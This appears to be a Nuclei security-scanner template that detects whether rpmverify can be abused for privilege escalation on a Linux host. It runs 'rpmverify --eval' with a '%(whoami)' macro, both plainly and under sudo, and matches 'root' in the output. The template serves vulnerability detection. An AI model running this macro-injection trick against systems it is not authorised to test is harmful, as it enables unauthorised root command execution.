code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'rpmverify --eval ''%(whoami 1>&2)''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo rpmverify --eval ''%(whoami 1>&2)''

    '
id: privesc-rpmverify
info:
  author: daffainfo
  description: 'The rpmverify command is used to verify the integrity and authenticity
    of installed RPM packages on a Linux system. It checks the files in the installed
    packages against the information stored in the RPM database to detect any modifications
    or discrepancies. This helps ensure the security and stability of the system by
    identifying any unauthorized changes to the installed packages.

    '
  metadata:
    max-request: 3
    verified: true
  name: rpmverify - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/rpmverify/
  severity: high
  tags: code,linux,rpmverify,privesc,local
self-contained: true
